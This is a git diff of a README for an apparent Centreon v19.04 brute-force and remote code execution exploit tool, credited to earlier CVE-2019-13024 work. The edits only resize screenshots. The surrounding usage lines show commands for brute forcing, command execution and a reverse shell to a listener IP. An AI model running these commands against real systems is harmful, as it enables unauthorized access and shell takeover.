@@ -34,7 +34,7 @@ Magic makes use of the ArgParse library, meaning you can get the help menu to ap
 python magic.py -h
 ```
 
-<img src="https://github.com/0xskunk/Centreon-v19.04-Brute-Forcer-RCE/blob/master/images/menu.PNG" width="800">
+<img src="https://github.com/0xskunk/Centreon-v19.04-Brute-Forcer-RCE/blob/master/images/menu.PNG" width="600">
 
 
 
@@ -43,7 +43,7 @@ python magic.py -h
 ```bash
 python magic.py -t 10.10.10.10 -p 80 -m 1
 ```
-<img src="https://github.com/0xskunk/Centreon-v19.04-Brute-Forcer-RCE/blob/master/images/brute.png" width="800">
+<img src="https://github.com/0xskunk/Centreon-v19.04-Brute-Forcer-RCE/blob/master/images/brute.PNG" width="600">
 
 
 
@@ -53,7 +53,7 @@ python magic.py -t 10.10.10.10 -p 80 -m 1
 python magic.py -t 10.10.10.10 -p 80 -m 2
 ```
 
-<img src="https://github.com/0xskunk/Centreon-v19.04-Brute-Forcer-RCE/blob/master/images/rce.png" width="800">
+<img src="https://github.com/0xskunk/Centreon-v19.04-Brute-Forcer-RCE/blob/master/images/rce.png" width="600">
 
 
 
@@ -64,7 +64,7 @@ Note: You must start your own listener to connect back to.
 ```bash
 python magic.py -t 10.10.10.10 -p 80 -m 3 -i 192.168.69.1 -l 443
 ```
-<img src="https://github.com/0xskunk/Centreon-v19.04-Brute-Forcer-RCE/blob/master/images/shell.png" width="800">
+<img src="https://github.com/0xskunk/Centreon-v19.04-Brute-Forcer-RCE/blob/master/images/shell.png" width="600">
 
 
 ### License and Credits
@@ -74,6 +74,7 @@ Code is open source and I welcome feedback, comments and requests. I wrote this 
 Originally, @mhasker wrote and discovered the exploit. I just added a brute forcer, the option to execute alternative commands, and shazam with the colours. I've linked his github below - great work.
 
 [mhasker](https://github.com/mhaskar/CVE-2019-13024)
+
 --------
 
 <img src="https://github.com/0xskunk/Resource-Program-for-Cyber-Students/blob/master/images/0xskunk1.PNG" width="250">
